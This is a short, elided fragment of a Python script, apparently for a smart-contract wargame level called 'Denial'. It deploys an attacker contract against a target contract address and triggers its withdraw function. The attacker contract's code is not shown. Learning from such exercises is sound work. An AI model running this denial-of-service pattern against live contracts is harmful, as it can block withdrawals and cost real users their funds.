...
target_address='0xB7cbfe4Dc7c21772469a78009876c1e31dB18a26'
target_ct=interface.Denial(target_address)

# deploy attacker contract
attacker_contract=denialAttack.deploy(target_ct.address, {'from': attacker, 'priority_fee': priority_fee})
...
def main():
    ...
    owner=accounts.at(target_ct.owner(), force=True)
    print('attacker:', attacker)
    print('owner:', owner)
    print('owner balance:', owner.balance())
    ...
    print('target_ct.partner(): ', target_ct.partner())

    # make contact function to pass the modifyer
    tx=target_ct.withdraw({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})
